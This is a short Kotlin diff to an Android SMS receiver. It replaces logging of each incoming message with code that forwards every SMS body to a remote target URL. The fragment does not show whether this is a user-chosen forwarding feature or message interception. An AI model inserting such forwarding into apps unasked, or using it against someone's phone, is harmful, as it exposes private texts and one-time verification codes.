@@ -22,8 +22,7 @@ class SmsListener : BroadcastReceiver() {
             if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
                 for (smsMessage: SmsMessage in Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                     val messageBody = smsMessage.messageBody
-
-                    Log.i(TAG, messageBody)
+                    SMSForward().execute(targetUrl, messageBody)
                 }
             }
         } else {
